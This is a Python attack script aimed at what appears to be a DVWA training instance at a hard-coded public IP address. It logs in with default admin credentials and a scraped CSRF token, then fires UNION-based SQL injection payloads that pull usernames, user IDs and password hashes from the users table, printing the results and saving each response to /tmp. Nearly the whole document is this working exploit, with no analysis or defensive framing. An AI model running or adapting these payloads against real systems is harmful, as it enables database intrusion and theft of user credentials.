
import requests
import re
from urllib.parse import quote

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    # SQL injection payloads to extract data
    # First, let's try simple injection to see what's available
    print("[*] Testing SQL injection with standard payload...")
    
    payloads = [
        ("1' UNION SELECT NULL,user,password FROM users--", "Extract from users table"),
        ("1' UNION SELECT NULL,CONCAT(user,':',password),password FROM users--", "Get all users with passwords"),
        ("1' UNION SELECT NULL,CONCAT_WS(':',user_id,user,password),password FROM users--", "Get all with IDs"),
        ("999 UNION SELECT NULL,CONCAT(user_id,':',user,':',password),password FROM users--", "Alternative format"),
    ]
    
    for payload, description in payloads:
        print(f"\n[*] Testing: {description}")
        print(f"[*] Payload: {payload}")
        
        params = {
            "id": payload,
            "Submit": "Submit"
        }
        
        try:
            response = session.get(sqli_url, params=params, timeout=10)
            
            # Look for results
            if "First name" in response.text:
                print("[+] Got response with data!")
                # Extract relevant part
                lines = response.text.split('\n')
                for i, line in enumerate(lines):
                    if "First name" in line or "Surname" in line or "user" in line.lower():
                        print(lines[max(0, i-5):min(len(lines), i+10)])
                        break
                
                # Save full response
                with open(f"/tmp/sqli_response_{description.replace(' ', '_')}.html", "w") as f:
                    f.write(response.text)
        except Exception as e:
            print(f"[-] Error: {e}")

